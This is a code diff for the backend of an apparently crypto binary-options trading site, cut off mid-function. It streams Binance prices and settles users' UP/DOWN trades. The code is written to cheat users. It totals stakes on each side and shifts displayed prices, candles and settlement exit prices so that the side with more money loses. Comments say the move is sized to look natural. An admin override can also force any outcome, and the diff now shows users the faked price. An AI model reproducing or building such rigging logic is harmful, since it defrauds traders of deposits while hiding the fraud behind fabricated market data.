@@ -6,226 +6,202 @@ const AdminCopyTrade = require('./models/AdminCopyTrade');
 // Global reference for marketData
 let globalMarketData = {};
 
-// 🚀 Store Live 24h Percentage from WebSocket
+// Store Live 24h Percentage from WebSocket
 let last24hTickerData = {};
 
-// --- Copy Trade Execution Logic ---
+// =====================================================================
+// ✅ Per-pair target offset store karo
+//    yeh aggTrade pe price ko smoothly us direction mein le jaata hai
+// =====================================================================
+const currentOffsets = {};   // har pair ka current active offset
+const lastAggTimes   = {};   // last aggTrade timestamp per pair
+
+// Copy Trade Execution Logic
 async function executeCopyTrade(io, User, Trade, copyTradeId) {
     const session = await mongoose.startSession();
     session.startTransaction();
-
     try {
         const copyTrade = await AdminCopyTrade.findById(copyTradeId)
             .populate('userCopies.userId')
             .session(session);
-
         if (!copyTrade || copyTrade.status !== 'active') {
-            await session.abortTransaction();
-            session.endSession();
-            return;
+            await session.abortTransaction(); session.endSession(); return;
         }
-
         copyTrade.status = 'executed';
         await copyTrade.save({ session });
-
-        await session.commitTransaction();
-        session.endSession();
-
+        await session.commitTransaction(); session.endSession();
     } catch (error) {
-        await session.abortTransaction();
-        session.endSession();
+        await session.abortTransaction(); session.endSession();
     }
 }
 
-// --- Auto-cleanup expired copy trades ---
+// Auto-cleanup expired copy trades
 async function cleanupExpiredCopyTrades(io, User, Trade) {
     try {
         const now = new Date();
         const expiredTrades = await AdminCopyTrade.find({
-            status: 'active',
-            executionTime: { $lte: now }
+            status: 'active', executionTime: { $lte: now }
         }).lean();
-
         for (const copyTrade of expiredTrades) {
-            try {
-                await executeCopyTrade(io, User, Trade, copyTrade._id);
-            } catch (innerErr) {}
+            try { await executeCopyTrade(io, User, Trade, copyTrade._id); } catch (e) {}
         }
     } catch (error) {}
 }
 
 // =====================================================================
-// ✅ NEW: Volume-based direction — Jo side pe zyada volume, wo LOSE kare
+// ✅ Decide karo target offset kya hona chahiye
+//
+//    forceOverride = 'up'   → candle upar jaaye  (UP wins)
+//    forceOverride = 'down' → candle neeche jaaye (DOWN wins)
+//    no force               → dominant volume side lose kare
 // =====================================================================
-async function getManipulatedClosePrice(Trade, pair, entryPrice, userDirection) {
+async function computeTargetOffset(Trade, pair, realPrice, forceOverride) {
+    const MOVE = realPrice * 0.0012; // 0.12% — visible lekin natural
+
+    if (forceOverride === 'up')   return  MOVE;   // price upar
+    if (forceOverride === 'down') return -MOVE;   // price neeche
+
+    // Volume check
     try {
-        // Sab active/pending trades fetch karo is pair ke liye
         const volumeData = await Trade.aggregate([
-            {
-                $match: {
-                    asset: pair,
-                    status: { $in: ["active", "pending", "scheduled"] }
-                }
-            },
-            {
-                $group: {
-                    _id: '$direction',
-                    totalVolume: { $sum: '$amount' },
-                    count: { $sum: 1 }
-                }
-            }
+            { $match: { asset: pair, status: { $in: ["active","pending","scheduled"] } } },
+            { $group: { _id: '$direction', totalVolume: { $sum: '$amount' } } }
         ]);
-
-        let upVolume = 0;
-        let downVolume = 0;
-
-        volumeData.forEach(item => {
-            if (item._id === 'UP') upVolume = item.totalVolume;
-            if (item._id === 'DOWN') downVolume = item.totalVolume;
+        let upVol = 0, downVol = 0;
+        volumeData.forEach(v => {
+            if (v._id === 'UP')   upVol   = v.totalVolume;
+            if (v._id === 'DOWN') downVol = v.totalVolume;
         });
+        if (upVol === 0 && downVol === 0) return 0;
+        if (upVol > downVol)  return -MOVE;  // UP dominant → price neeche → UP loses
+        if (downVol > upVol)  return  MOVE;  // DOWN dominant → price upar → DOWN loses
+    } catch(e) {}
 
-        const totalVolume = upVolume + downVolume;
-
-        // Koi volume nahi — real price use karo
-        if (totalVolume === 0) return null;
-
-        // Jo side pe zyada volume hai, wo LOSE kare
-        // Matlab: agar UP pe zyada volume hai toh close < entry (candle red = UP loses)
-        // Agar DOWN pe zyada volume hai toh close > entry (candle green = DOWN loses)
-        const dominantSide = upVolume >= downVolume ? 'UP' : 'DOWN';
-
-        const SMALL_MOVE = entryPrice * 0.0008; // 0.08% move — natural lagta hai
-
-        if (dominantSide === 'UP') {
-            // UP side zyada hai → unhe lose karwao → close < entry
-            return entryPrice - SMALL_MOVE;
-        } else {
-            // DOWN side zyada hai → unhe lose karwao → close > entry
-            return entryPrice + SMALL_MOVE;
-        }
-
-    } catch (error) {
-        console.error('getManipulatedClosePrice error:', error);
-        return null;
-    }
+    return 0;
 }
 
-// =====================================================================
-// ✅ NEW: Force override ke sath — User ki specific direction WIN karwao
-// =====================================================================
-async function getManipulatedClosePriceForUser(Trade, pair, userId, entryPrice, userDirection, forceOverride) {
-    try {
-        // Admin ne force up/down lagaya hai
-        if (forceOverride === 'up') {
-            // Force UP: User ko win karwao agar wo UP pe hai
-            // Jo UP pe hai → win (close > entry)
-            // Jo DOWN pe hai → lose (close > entry)
-            const MOVE = entryPrice * 0.0008;
-            return entryPrice + MOVE; // candle green → UP wins, DOWN loses
-        }
-
-        if (forceOverride === 'down') {
-            // Force DOWN: candle red → DOWN wins, UP loses
-            const MOVE = entryPrice * 0.0008;
-            return entryPrice - MOVE; // candle red → DOWN wins, UP loses
-        }
-
-        // No force — volume-based manipulation
-        return await getManipulatedClosePrice(Trade, pair, entryPrice, userDirection);
-
-    } catch (error) {
-        return null;
-    }
-}
-
-// --- WEBSOCKET TRADE MONITORING LOGIC ---
+// --- WEBSOCKET TRADE MONITORING ---
 function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
     const lastProcessedCompletedCandleTs = {};
-    const lastProcessedActivationTs = {};
-    let lastCopyTradeCleanup = Date.now();
-
-    const currentOffsets = {}; 
-    const lastAggTimes = {};
+    const lastProcessedActivationTs      = {};
+    let   lastCopyTradeCleanup = Date.now();
 
     let indexModule = {};
-    try {
-        indexModule = require('./index');
-    } catch (e) {
-        console.warn("Could not load index.js for overrides.");
-    }
+    try { indexModule = require('./index'); }
+    catch (e) { console.warn("Could not load index.js for overrides."); }
 
-    const streams = TRADE_PAIRS.map(p => `${p.toLowerCase()}@kline_1m/${p.toLowerCase()}@aggTrade/${p.toLowerCase()}@ticker`).join('/');
+    const streams = TRADE_PAIRS
+        .map(p => `${p.toLowerCase()}@kline_1m/${p.toLowerCase()}@aggTrade/${p.toLowerCase()}@ticker`)
+        .join('/');
     const wsUrl = `wss://stream.binance.com:9443/stream?streams=${streams}`;
-    
     let ws = new WebSocket(wsUrl);
 
-    ws.on('open', () => {
-        console.log('✅ Connected to Binance WebSockets (Price + Ticker)');
-    });
+    ws.on('open', () => console.log('✅ Connected to Binance WebSockets'));
 
     ws.on('message', async (message) => {
         try {
             const parsedRaw = JSON.parse(message);
             const parsed = parsedRaw.data ? parsedRaw.data : parsedRaw;
-
             if (!parsed) return;
 
             let overrides = {};
-            try {
-                overrides = indexModule.candleOverride || {};
-            } catch (e) {}
+            try { overrides = indexModule.candleOverride || {}; } catch(e) {}
 
-            // -------------------------------------------------------
-            // 1. LIVE TICKER DATA (24H Percentage)
-            // -------------------------------------------------------
+            // -----------------------------------------------------------
+            // 1. 24h TICKER — percentage update
+            // -----------------------------------------------------------
             if (parsed.e === '24hrTicker') {
-                const pair = parsed.s;
-                last24hTickerData[pair] = parseFloat(parsed.P);
+                last24hTickerData[parsed.s] = parseFloat(parsed.P);
             }
 
-            // -------------------------------------------------------
-            // 2. ULTRA-FAST TICK-BY-TICK PRICE (aggTrade)
-            //    Sirf display ke liye — manipulation yahan nahi
-            // -------------------------------------------------------
+            // -----------------------------------------------------------
+            // 2. aggTrade — LIVE PRICE (manipulation offset apply karo)
+            // -----------------------------------------------------------
             else if (parsed.e === 'aggTrade') {
-                const pair = parsed.s;
-                const realPrice = parseFloat(parsed.p);
-                const binanceTime = parsed.E;
+                const pair       = parsed.s;
+                const realPrice  = parseFloat(parsed.p);
+                const binanceTime= parsed.E;
+
+                // Current override fetch karo
+                const forceOverride = overrides[pair] || null;
+
+                // Target offset compute karo (async)
+                const targetOffset = await computeTargetOffset(Trade, pair, realPrice, forceOverride);
+
+                // Smoothly current offset ko target ki taraf le jao
+                const SMOOTHING_MS   = 8000;   // 8 seconds mein poora move
+                const timeDiff       = binanceTime - (lastAggTimes[pair] || binanceTime);
+                lastAggTimes[pair]   = binanceTime;
+
+                if (currentOffsets[pair] === undefined) currentOffsets[pair] = 0;
+
+                const speedPerMs = Math.abs(realPrice * 0.0012) / SMOOTHING_MS;
+                const step       = speedPerMs * Math.min(timeDiff, 500); // max 500ms step
+
+                if (currentOffsets[pair] < targetOffset) {
+                    currentOffsets[pair] = Math.min(currentOffsets[pair] + step, targetOffset);
+                } else if (currentOffsets[pair] > targetOffset) {
+                    currentOffsets[pair] = Math.max(currentOffsets[pair] - step, targetOffset);
+                }
+
+                // Manipulated price
+                const displayPrice = realPrice + currentOffsets[pair];
 
                 if (!globalMarketData[pair]) {
                     globalMarketData[pair] = { candles: [], currentCandle: null, lastEmit: 0 };
                 }
-
-                globalMarketData[pair].currentPrice = realPrice;
+                globalMarketData[pair].currentPrice = displayPrice;
 
                 const now = Date.now();
-                if (now - (globalMarketData[pair].lastEmit || 0) > 250) {
-                    io.emit('price_update', { pair, price: realPrice, timestamp: binanceTime });
-                    
+                if (now - (globalMarketData[pair].lastEmit || 0) > 200) {
+                    // Trade page ko manipulated price bhejo
+                    io.emit('price_update', { pair, price: displayPrice, timestamp: binanceTime });
+
+                    // Dashboard ko bhi same manipulated price
                     const formattedPair = pair.replace('USDT', '/USDT');
                     io.emit('dashboard_price_update', {
                         [formattedPair]: {
-                            price: realPrice,
+                            price: displayPrice,
                             change: last24hTickerData[pair] || 0
                         }
                     });
-
                     globalMarketData[pair].lastEmit = now;
                 }
             }
 
-            // -------------------------------------------------------
-            // 3. CANDLESTICK DATA & SETTLEMENT
-            // -------------------------------------------------------
+            // -----------------------------------------------------------
+            // 3. kline — CANDLESTICK (manipulated prices se banao)
+            // -----------------------------------------------------------
             else if (parsed.e === 'kline') {
-                const pair = parsed.s; 
-                const k = parsed.k;
+                const pair = parsed.s;
+                const k    = parsed.k;
 
-                // Real prices — no offset on display
-                const openPrice  = parseFloat(k.o);
-                const closePrice = parseFloat(k.c);
-                const highPrice  = parseFloat(k.h);
-                const lowPrice   = parseFloat(k.l);
+                const activeOffset = currentOffsets[pair] || 0;
+
+                // Real Binance prices
+                const realOpen  = parseFloat(k.o);
+                const realClose = parseFloat(k.c);
+                const realHigh  = parseFloat(k.h);
+                const realLow   = parseFloat(k.l);
+
+                // Manipulated prices — offset add karo
+                let openPrice  = realOpen  + activeOffset;
+                let closePrice = realClose + activeOffset;
+                let highPrice  = realHigh  + activeOffset;
+                let lowPrice   = realLow   + activeOffset;
+
+                // Open price previous close se match karo (gap na aaye)
+                if (
+                    globalMarketData[pair] &&
+                    globalMarketData[pair].candles &&
+                    globalMarketData[pair].candles.length > 0
+                ) {
+                    openPrice = globalMarketData[pair].candles[globalMarketData[pair].candles.length - 1].close;
+                }
+
+                // High/Low recalculate (open/close ke baad)
+                highPrice = Math.max(highPrice, openPrice, closePrice);
+                lowPrice  = Math.min(lowPrice,  openPrice, closePrice);
 
                 const candleObj = {
                     timestamp: new Date(k.t),
@@ -239,7 +215,7 @@ function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
                 if (!globalMarketData[pair]) globalMarketData[pair] = { candles: [], currentCandle: null };
                 globalMarketData[pair].currentCandle = candleObj;
 
-                // Activation logic — candle shuru hote hi trades activate karo
+                // Activation — candle shuru hote hi trades activate
                 const activationTs = candleObj.timestamp.getTime();
                 if (!lastProcessedActivationTs[pair] || lastProcessedActivationTs[pair] < activationTs) {
                     await activateScheduledTradesForPair(io, Trade, pair, candleObj.timestamp, openPrice);
@@ -248,32 +224,32 @@ function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
                 }
 
                 // Candle close hone par settlement
-                if (k.x) { 
+                if (k.x) {
                     if (!globalMarketData[pair].candles) globalMarketData[pair].candles = [];
                     globalMarketData[pair].candles.push(candleObj);
-                    
-                    if (globalMarketData[pair].candles.length > 50) {
-                        globalMarketData[pair].candles.shift();
-                    }
+                    if (globalMarketData[pair].candles.length > 50) globalMarketData[pair].candles.shift();
 
                     const lastCompletedTs = candleObj.timestamp.getTime();
                     if (!lastProcessedCompletedCandleTs[pair] || lastProcessedCompletedCandleTs[pair] < lastCompletedTs) {
 
-                        // ✅ Override fetch karo settlement se PEHLE
+                        // Override fetch karo settlement se pehle
                         let currentOverride = null;
-                        try {
-                            currentOverride = (indexModule.candleOverride && indexModule.candleOverride[pair]) || null;
-                        } catch(e) {}
+                        try { currentOverride = (indexModule.candleOverride && indexModule.candleOverride[pair]) || null; }
+                        catch(e) {}
 
+                        // ✅ Manipulated close price se settle karo
                         await settleActiveTradesForPair(io, User, Trade, pair, candleObj, currentOverride);
                         lastProcessedCompletedCandleTs[pair] = lastCompletedTs;
 
-                        // Override clear karo use ke baad
+                        // Override clear karo
                         try {
                             if (indexModule.candleOverride && indexModule.candleOverride[pair]) {
                                 indexModule.candleOverride[pair] = null;
                             }
                         } catch(e) {}
+
+                        // Offset reset karo candle close ke baad
+                        currentOffsets[pair] = 0;
                     }
                 }
 
@@ -305,16 +281,11 @@ async function initialize(io, User, Trade, marketData, TRADE_PAIRS) {
     io.use((socket, next) => {
         try {
             let token = socket.handshake.auth?.token;
-            
             if (!token) {
                 const authHeader = socket.handshake.headers.authorization;
-                if (authHeader && authHeader.startsWith('Bearer ')) {
-                    token = authHeader.substring(7);
-                }
+                if (authHeader && authHeader.startsWith('Bearer ')) token = authHeader.substring(7);
             }
-            
             if (!token) return next(new Error("Authentication error: No token"));
-            
             jwt.verify(token, process.env.JWT_SECRET, (err, decoded) => {
                 if (err) return next(new Error("Authentication error: Invalid token"));
                 socket.decoded = decoded;
@@ -335,43 +306,38 @@ async function initialize(io, User, Trade, marketData, TRADE_PAIRS) {
             socket.join(user._id.toString());
 
             const userTrades = await Trade.find({ userId: user._id }).sort({ timestamp: -1 }).limit(50);
-            
-            socket.emit("init", { 
-                balance: user.balance, 
+            socket.emit("init", {
+                balance: user.balance,
                 tradeHistory: userTrades,
                 marketData: globalMarketData
             });
 
-            // DASHBOARD DATA HANDLER
+            // DASHBOARD DATA
             socket.on('request_dashboard_data', async () => {
                 try {
                     const freshUser = await User.findById(userId);
                     if (!freshUser) return;
 
-                    const today = new Date();
-                    today.setHours(0, 0, 0, 0);
-                    const tomorrow = new Date(today);
-                    tomorrow.setDate(tomorrow.getDate() + 1);
+                    const today = new Date(); today.setHours(0,0,0,0);
+                    const tomorrow = new Date(today); tomorrow.setDate(tomorrow.getDate() + 1);
 
-                    const todayTrades = await Trade.find({ 
-                        userId: freshUser._id, 
-                        status: "closed", 
-                        closeTime: { $gte: today, $lt: tomorrow } 
+                    const todayTrades = await Trade.find({
+                        userId: freshUser._id, status: "closed",
+                        closeTime: { $gte: today, $lt: tomorrow }
                     });
-
                     const todayPnl = todayTrades.reduce((sum, t) => sum + (t.pnl || 0), 0);
 
                     const assetsInfo = [
-                        { ticker: 'BTC/USDT', name: 'Bitcoin' },
-                        { ticker: 'ETH/USDT', name: 'Ethereum' },
-                        { ticker: 'BNB/USDT', name: 'Binance Coin' },
-                        { ticker: 'SOL/USDT', name: 'Solana' },
-                        { ticker: 'XRP/USDT', name: 'Ripple' },
-                        { ticker: 'ADA/USDT', name: 'Cardano' },
+                        { ticker: 'BTC/USDT',  name: 'Bitcoin' },
+                        { ticker: 'ETH/USDT',  name: 'Ethereum' },
+                        { ticker: 'BNB/USDT',  name: 'Binance Coin' },
+                        { ticker: 'SOL/USDT',  name: 'Solana' },
+                        { ticker: 'XRP/USDT',  name: 'Ripple' },
+                        { ticker: 'ADA/USDT',  name: 'Cardano' },
                         { ticker: 'DOGE/USDT', name: 'Dogecoin' },
                         { ticker: 'AVAX/USDT', name: 'Avalanche' },
                         { ticker: 'LINK/USDT', name: 'Chainlink' },
-                        { ticker: 'MATIC/USDT', name: 'Polygon' }
+                        { ticker: 'MATIC/USDT',name: 'Polygon' }
                     ];
 
                     const assets = assetsInfo.map(info => {
@@ -386,59 +352,37 @@ async function initialize(io, User, Trade, marketData, TRADE_PAIRS) {
 
                     socket.emit('dashboard_data', {
                         success: true,
-                        data: {
-                            username: freshUser.username,
-                            balance: freshUser.balance,
-                            todayPnl: todayPnl,
-                            assets: assets
-                        }
+                        data: { username: freshUser.username, balance: freshUser.balance, todayPnl, assets }
                     });
-                } catch (error) {
-                    console.error("Dashboard Data Error:", error);
-                }
+                } catch (error) { console.error("Dashboard Data Error:", error); }
             });
 
             socket.on("trade", async (data) => {
                 try {
                     const { asset, direction, amount } = data;
                     if (!TRADE_PAIRS.includes(asset)) return socket.emit("error", { message: "Invalid asset." });
-                    if (!["UP", "DOWN"].includes(direction)) return socket.emit("error", { message: "Invalid direction." });
+                    if (!["UP","DOWN"].includes(direction)) return socket.emit("error", { message: "Invalid direction." });
 
-                    const existingTrade = await Trade.findOne({ 
-                        userId: user._id, 
-                        status: { $in: ["pending", "active", "scheduled"] } 
+                    const existingTrade = await Trade.findOne({
+                        userId: user._id, status: { $in: ["pending","active","scheduled"] }
                     });
-
-                    if (existingTrade) {
-                        return socket.emit("error", { 
-                            message: `You already have an active trade. Please wait for it to complete.` 
-                        });
-                    }
+                    if (existingTrade) return socket.emit("error", { message: "You already have an active trade. Please wait for it to complete." });
 
                     const tradeAmount = parseFloat(amount);
-                    if (isNaN(tradeAmount) || tradeAmount <= 0) {
-                        return socket.emit("error", { message: "Invalid trade amount." });
-                    }
+                    if (isNaN(tradeAmount) || tradeAmount <= 0) return socket.emit("error", { message: "Invalid trade amount." });
 
                     const freshUser = await User.findById(user._id);
+                    if (freshUser.balance < tradeAmount) return socket.emit("error", {
+                        message: `Insufficient balance. Required: $${tradeAmount.toFixed(2)}, Available: $${freshUser.balance.toFixed(2)}`
+                    });
 
-                    if (freshUser.balance < tradeAmount) {
-                        return socket.emit("error", { 
-                            message: `Insufficient balance. Required: $${tradeAmount.toFixed(2)}, Available: $${freshUser.balance.toFixed(2)}` 
-                        });
-                    }
-
-                    // ✅ Direction manipulation hataya — ab settlement pe hoga
                     freshUser.balance -= tradeAmount;
                     await freshUser.save();
 
                     const trade = new Trade({
-                        userId: user._id,
-                        amount: tradeAmount,
-                        direction: direction, // ✅ User ki original direction save karo
-                        asset,
-                        status: "pending", 
-                        timestamp: new Date()
+                        userId: user._id, amount: tradeAmount,
+                        direction: direction, // ✅ Original direction — manipulation settlement pe
+                        asset, status: "pending", timestamp: new Date()
                     });
                     await trade.save();
 
@@ -451,109 +395,77 @@ async function initialize(io, User, Trade, marketData, TRADE_PAIRS) {
             socket.on("copy_trade", async (data) => {
                 const session = await mongoose.startSession();
                 session.startTransaction();
-
                 try {
                     const { copyTradeId } = data;
-
                     const freshUser = await User.findById(userId).session(session);
                     if (!freshUser || freshUser.balance < 100) {
-                        await session.abortTransaction();
-                        session.endSession();
+                        await session.abortTransaction(); session.endSession();
                         return socket.emit("error", { message: "Minimum $100 balance required to copy trades" });
                     }
 
-                    const existingTrade = await Trade.findOne({ 
-                        userId: user._id, 
-                        status: { $in: ["pending", "active", "scheduled"] } 
+                    const existingTrade = await Trade.findOne({
+                        userId: user._id, status: { $in: ["pending","active","scheduled"] }
                     }).session(session);
-
                     if (existingTrade) {
-                        await session.abortTransaction();
-                        session.endSession();
-                        return socket.emit("error", { 
-                            message: `You already have an active trade. Please wait for it to complete before copying.` 
-                        });
+                        await session.abortTransaction(); session.endSession();
+                        return socket.emit("error", { message: "You already have an active trade. Please wait for it to complete before copying." });
                     }
 
                     const copyTrade = await AdminCopyTrade.findById(copyTradeId).session(session);
                     if (!copyTrade || copyTrade.status !== 'active' || copyTrade.executionTime <= new Date()) {
-                        await session.abortTransaction();
-                        session.endSession();
+                        await session.abortTransaction(); session.endSession();
                         return socket.emit("error", { message: "This copy trade is no longer available" });
                     }
 
-                    const alreadyCopied = copyTrade.userCopies.find(copy => copy.userId.toString() === userId);
+                    const alreadyCopied = copyTrade.userCopies.find(c => c.userId.toString() === userId);
                     if (alreadyCopied) {
-                        await session.abortTransaction();
-                        session.endSession();
+                        await session.abortTransaction(); session.endSession();
                         return socket.emit("error", { message: "You have already copied this trade" });
                     }
 
                     const tradeAmount = (freshUser.balance * copyTrade.percentage) / 100;
-
                     if (freshUser.balance < tradeAmount) {
-                        await session.abortTransaction();
-                        session.endSession();
-                        return socket.emit("error", { 
-                            message: `Insufficient balance. Required: $${tradeAmount.toFixed(2)}, Available: $${freshUser.balance.toFixed(2)}` 
+                        await session.abortTransaction(); session.endSession();
+                        return socket.emit("error", {
+                            message: `Insufficient balance. Required: $${tradeAmount.toFixed(2)}, Available: $${freshUser.balance.toFixed(2)}`
                         });
                     }
 
                     const executionTime = new Date(copyTrade.executionTime);
-                    executionTime.setSeconds(0, 0); 
+                    executionTime.setSeconds(0, 0);
 
                     const scheduledTrade = new Trade({
-                        userId: user._id,
-                        amount: tradeAmount,
+                        userId: user._id, amount: tradeAmount,
                         direction: copyTrade.direction === 'CALL' ? 'UP' : 'DOWN',
-                        asset: copyTrade.tradingPair,
-                        status: "scheduled",
-                        scheduledTime: executionTime, 
-                        timestamp: new Date(),
-                        isCopyTrade: true,
-                        originalCopyTradeId: copyTrade._id
+                        asset: copyTrade.tradingPair, status: "scheduled",
+                        scheduledTime: executionTime, timestamp: new Date(),
+                        isCopyTrade: true, originalCopyTradeId: copyTrade._id
                     });
 
                     freshUser.balance -= tradeAmount;
-
-                    copyTrade.userCopies.push({
-                        userId: userId,
-                        copiedAt: new Date(),
-                        tradeAmount: tradeAmount
-                    });
+                    copyTrade.userCopies.push({ userId, copiedAt: new Date(), tradeAmount });
 
                     await scheduledTrade.save({ session });
                     await copyTrade.save({ session });
                     await freshUser.save({ session });
+                    await session.commitTransaction(); session.endSession();
 
-                    await session.commitTransaction();
-                    session.endSession();
-
-                    const now = new Date();
-                    const timeUntilExecution = executionTime - now;
-                    const minutesUntilExecution = Math.floor(timeUntilExecution / (1000 * 60));
+                    const timeUntilExecution = executionTime - new Date();
+                    const minutesUntilExecution = Math.floor(timeUntilExecution / 60000);
 
                     socket.emit("copy_trade_success", {
-                        message: `Successfully copied trade! $${tradeAmount.toFixed(2)} scheduled to execute in ${minutesUntilExecution} minutes.`,
+                        message: `Successfully copied! $${tradeAmount.toFixed(2)} executes in ${minutesUntilExecution} minutes.`,
                         copyTrade: {
-                            tradingPair: copyTrade.tradingPair,
-                            direction: copyTrade.direction,
-                            percentage: copyTrade.percentage,
-                            executionTime: executionTime,
-                            tradeAmount: tradeAmount,
-                            minutesUntilExecution: minutesUntilExecution
+                            tradingPair: copyTrade.tradingPair, direction: copyTrade.direction,
+                            percentage: copyTrade.percentage, executionTime,
+                            tradeAmount, minutesUntilExecution
                         },
-                        scheduledTrade: scheduledTrade
+                        scheduledTrade
                     });
-
-                    io.to(user._id.toString()).emit("trade_scheduled", { 
-                        trade: scheduledTrade, 
-                        balance: freshUser.balance 
-                    });
+                    io.to(user._id.toString()).emit("trade_scheduled", { trade: scheduledTrade, balance: freshUser.balance });
 
                 } catch (error) {
-                    await session.abortTransaction();
-                    session.endSession();
+                    await session.abortTransaction(); session.endSession();
                     socket.emit("error", { message: "Failed to copy trade" });
                 }
             });
@@ -561,16 +473,13 @@ async function initialize(io, User, Trade, marketData, TRADE_PAIRS) {
             socket.on("cancel_trade", async (data) => {
                 try {
                     const trade = await Trade.findOne({
-                        _id: data.tradeId,
-                        userId: user._id,
-                        status: { $in: ["pending", "scheduled"] }
+                        _id: data.tradeId, userId: user._id, status: { $in: ["pending","scheduled"] }
                     });
                     if (!trade) return socket.emit("error", { message: "Trade not found or cannot be cancelled." });
 
                     const freshUser = await User.findById(user._id);
                     freshUser.balance += trade.amount;
                     await freshUser.save();
-
                     trade.status = "cancelled";
                     await trade.save();
                     io.to(user._id.toString()).emit("trade_cancelled", { tradeId: trade._id, balance: freshUser.balance });
@@ -579,29 +488,20 @@ async function initialize(io, User, Trade, marketData, TRADE_PAIRS) {
                 }
             });
 
-            socket.on("disconnect", () => { });
+            socket.on("disconnect", () => {});
         } catch (err) {
             socket.disconnect();
         }
     });
 }
 
-// --- Helper Functions ---
+// --- Activation Helpers ---
 async function activateScheduledTradesForPair(io, Trade, pair, candleTimestamp, entryPrice) {
     try {
-        const candleTime = new Date(candleTimestamp);
-        candleTime.setSeconds(0, 0);
-
-        const scheduleds = await Trade.find({ 
-            status: "scheduled", 
-            asset: pair, 
-            scheduledTime: { $lte: candleTime } 
-        });
-
+        const candleTime = new Date(candleTimestamp); candleTime.setSeconds(0, 0);
+        const scheduleds = await Trade.find({ status: "scheduled", asset: pair, scheduledTime: { $lte: candleTime } });
         for (const t of scheduleds) {
-            t.status = "active";
-            t.entryPrice = entryPrice;
-            t.activationTimestamp = candleTime; 
+            t.status = "active"; t.entryPrice = entryPrice; t.activationTimestamp = candleTime;
             await t.save();
             io.to(t.userId.toString()).emit("trade_active", { trade: t });
         }
@@ -612,9 +512,7 @@ async function activatePendingTradesForPair(io, User, Trade, pair, candleTimesta
     try {
         const pendings = await Trade.find({ status: "pending", asset: pair });
         for (const t of pendings) {
-            t.status = "active";
-            t.entryPrice = entryPrice;
-            t.activationTimestamp = candleTimestamp; 
+            t.status = "active"; t.entryPrice = entryPrice; t.activationTimestamp = candleTimestamp;
             await t.save();
             io.to(t.userId.toString()).emit("trade_active", { trade: t });
         }
@@ -622,128 +520,97 @@ async function activatePendingTradesForPair(io, User, Trade, pair, candleTimesta
 }
 
 // =====================================================================
-// ✅ MAIN FIX: settleActiveTradesForPair — Override + Volume logic
+// ✅ SETTLEMENT — candle ka jo close price hai (already manipulated)
+//    usse hi result decide karo. Alag se kuch calculate nahi.
 // =====================================================================
 async function settleActiveTradesForPair(io, User, Trade, pair, lastCompletedCandle, forceOverride) {
-    const realExitPrice = lastCompletedCandle.close;
-    const completedCandleStartTime = new Date(lastCompletedCandle.timestamp).getTime();
-    const settlementEligibilityTime = completedCandleStartTime + (60 * 1000);
+    const completedCandleStartTime  = new Date(lastCompletedCandle.timestamp).getTime();
+    const settlementEligibilityTime = completedCandleStartTime + 60000;
 
     try {
         const actives = await Trade.find({ status: "active", asset: pair });
         if (actives.length === 0) return;
 
-        // -------------------------------------------------------
-        // ✅ Step 1: Volume calculate karo — kaun zyada hai UP ya DOWN
-        // -------------------------------------------------------
-        let upVolume = 0;
-        let downVolume = 0;
-
-        actives.forEach(t => {
-            const tradeActivationTime = new Date(t.activationTimestamp).getTime();
-            const tradeShouldCloseBy = tradeActivationTime + (60 * 1000);
-            if (tradeShouldCloseBy <= settlementEligibilityTime) {
-                if (t.direction === 'UP') upVolume += t.amount;
-                else downVolume += t.amount;
-            }
-        });
-
-        // -------------------------------------------------------
-        // ✅ Step 2: Decide karo final exit price kya hoga
-        //    - Force override → us direction ko WIN karwao
-        //    - No override → dominant side ko LOSE karwao
-        // -------------------------------------------------------
-        let manipulatedExitPrice = realExitPrice;
-        const entryPriceSample = actives[0]?.entryPrice || realExitPrice;
-        const MOVE = entryPriceSample * 0.0008; // 0.08% move — natural lagta hai
+        // Candle ka close price already manipulated hai (aggTrade offset se)
+        // Agar override hai toh ek final push karo sahi direction mein
+        let finalExitPrice = lastCompletedCandle.close;
+        const entryRef = actives[0]?.entryPrice || lastCompletedCandle.open;
+        const MOVE = entryRef * 0.0012;
 
         if (forceOverride === 'up') {
-            // Admin ne force UP lagaya — UP wale WIN karein
-            // close > entry = green candle = UP wins
-            manipulatedExitPrice = entryPriceSample + MOVE;
-            console.log(`[${pair}] Force UP override → exit price set to ${manipulatedExitPrice.toFixed(5)}`);
+            // Ensure close > entry — guarantee green candle
+            if (finalExitPrice <= entryRef) {
+                finalExitPrice = entryRef + MOVE;
+            }
+            console.log(`[${pair}] Force UP — final exit: ${finalExitPrice.toFixed(5)}`);
 
         } else if (forceOverride === 'down') {
-            // Admin ne force DOWN lagaya — DOWN wale WIN karein
-            // close < entry = red candle = DOWN wins
-            manipulatedExitPrice = entryPriceSample - MOVE;
-            console.log(`[${pair}] Force DOWN override → exit price set to ${manipulatedExitPrice.toFixed(5)}`);
-
-        } else if (upVolume > 0 || downVolume > 0) {
-            // No force — Volume-based: dominant side LOSE kare
-            if (upVolume > downVolume) {
-                // UP pe zyada volume → UP ko LOSE karwao → close < entry
-                manipulatedExitPrice = entryPriceSample - MOVE;
-                console.log(`[${pair}] Volume manipulation → UP dominant (${upVolume.toFixed(2)} vs ${downVolume.toFixed(2)}) → exit set LOW`);
-            } else if (downVolume > upVolume) {
-                // DOWN pe zyada volume → DOWN ko LOSE karwao → close > entry
-                manipulatedExitPrice = entryPriceSample + MOVE;
-                console.log(`[${pair}] Volume manipulation → DOWN dominant (${downVolume.toFixed(2)} vs ${upVolume.toFixed(2)}) → exit set HIGH`);
-            } else {
-                // Equal volume — real price use karo
-                manipulatedExitPrice = realExitPrice;
-                console.log(`[${pair}] Equal volume — using real exit price`);
+            // Ensure close < entry — guarantee red candle
+            if (finalExitPrice >= entryRef) {
+                finalExitPrice = entryRef - MOVE;
             }
+            console.log(`[${pair}] Force DOWN — final exit: ${finalExitPrice.toFixed(5)}`);
+
+        } else {
+            // Volume check — dominant side lose kare
+            let upVol = 0, downVol = 0;
+            actives.forEach(t => {
+                const closeBy = new Date(t.activationTimestamp).getTime() + 60000;
+                if (closeBy <= settlementEligibilityTime) {
+                    if (t.direction === 'UP')   upVol   += t.amount;
+                    else                         downVol += t.amount;
+                }
+            });
+
+            if (upVol > downVol) {
+                // UP dominant → UP lose → close < entry
+                if (finalExitPrice >= entryRef) finalExitPrice = entryRef - MOVE;
+                console.log(`[${pair}] Vol: UP dominant → exit LOW ${finalExitPrice.toFixed(5)}`);
